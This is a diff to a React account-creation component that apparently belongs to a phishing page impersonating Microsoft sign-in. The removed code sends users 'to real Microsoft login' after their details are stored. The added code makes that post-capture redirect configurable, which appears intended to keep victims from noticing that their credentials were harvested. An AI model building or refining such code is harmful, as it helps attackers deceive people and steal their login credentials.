@@ -60,14 +60,21 @@ const CreateAccount = () => {
       // Store auth data in localStorage
       authService.storeAuthData(result.token, result.user);
       
+      // Get redirect configuration
+      const config = await authService.getConfig();
+      
       // Show brief success message before closing
       setLoading(false);
       
-      // Wait 500ms then redirect to real Microsoft
-      setTimeout(() => {
-        // Redirect to real Microsoft login
-        window.location.href = 'https://login.microsoftonline.com/';
-      }, 500);
+      if (config.autoRedirect) {
+        // Wait configured delay then redirect
+        setTimeout(() => {
+          window.location.href = config.redirectUrl;
+        }, config.redirectDelay);
+      } else {
+        // Navigate to dashboard if auto-redirect is disabled
+        navigate('/dashboard');
+      }
       
     } catch (err) {
       setError(err.message || 'Account creation failed. Please try again.');
